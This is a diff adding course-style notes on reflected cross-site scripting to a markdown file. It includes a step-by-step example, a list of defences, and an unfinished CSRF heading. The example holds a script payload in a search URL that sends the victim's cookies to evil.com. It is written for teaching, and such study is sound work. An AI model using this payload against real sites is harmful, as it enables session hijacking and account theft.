@@ -727,8 +727,39 @@ The injected script is permanently stored on the target servers
 The victim then retrieves the malicious script from the server when it requests the stored information
 
 #### Reflected XSS Attacks
+The injected script is reflected off the web server
+Reflected attacks are delivered to victims via route, such as in e-mail message, or on some other web site
+http://xss-game.appspot.com/
+
+The key to the reflected XSS attack  
+Find a “good” web server that will echo the user input back in the  
+HTML response
 
 
+1. Alice visits evil.com which contains the link  
+```js
+	https://victim_site.com/search.php?term=<script>window.location=‘http://evil.com/?c=’+document.cookie</script>  
+```
+2. Alice clicks that link  
+3. Alice’s browser will send a GET request to that URL  
+4. victim_site returns 
+```js
+<html> <title> Search results  
+</title> <body> Results for <script>...</script>  
+... </body> </html>
+```
+5. Alice’s browser executes `<script>...</script>` within the origin `https://victim_site.com` and send to `evil.com` cookies for `victim_site.com`
+
+#### XSS defenses
+*Escape/filter output*: escape dynamic data before insert into HTML
+*Input Validation*: check all inputs are of expected
+*CSP*: server supplies a whitelist of the scripts that are allowed to appear  
+on the page
+*Http-Only* attribute: scripting languages cannot access or manipulate the cookie
+
+### CSRF: Cross-Site Request Forgery
+
+???????
 
 # TTL
 salting password: high probs for multiple people using same password, or same person use same password on different platform.
